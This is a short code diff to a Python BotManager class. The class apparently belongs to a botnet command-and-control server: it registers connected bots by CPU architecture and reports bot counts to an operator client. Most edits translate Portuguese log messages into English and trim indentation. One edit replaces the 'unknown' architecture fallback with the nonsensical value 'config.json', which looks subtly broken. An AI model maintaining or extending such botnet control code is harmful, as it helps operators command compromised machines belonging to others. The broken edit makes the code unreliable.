@@ -9,7 +9,7 @@ class BotManager:
     
     def register(self, client, address, arch):
         if arch not in self.bots_by_arch:
-            arch = 'unknown'
+            arch = 'config.json'
         
         with self.locks['bots']:
             for bot_addr in self.bots.values():
@@ -20,7 +20,7 @@ class BotManager:
             self.bots[client] = address
             self.bots_by_arch[arch].append((client, address))
         
-        logging.info(f"Bot conectado: {address[0]} ({arch})")
+        logging.info(f"Connected bot: {address[0]} ({arch})")
         return True
     
     def remove(self, client):
@@ -39,7 +39,7 @@ class BotManager:
                         break
 
                 self.bots.pop(client)
-                logging.info(f"Bot desconectado: {address}")
+                logging.info(f"Disconnected bot: {address}")
                 return True
         return False
     
@@ -81,7 +81,7 @@ class BotManager:
             
             for arch, bot_list in self.bots_by_arch.items():
                 if len(bot_list) > 0:
-                    send_func(client, f"     {Fore.WHITE}{arch}: {Fore.GREEN}{len(bot_list)}")
+                    send_func(client, f"{Fore.WHITE}{arch}: {Fore.GREEN}{len(bot_list)}")
                     
             send_func(client, '')
 
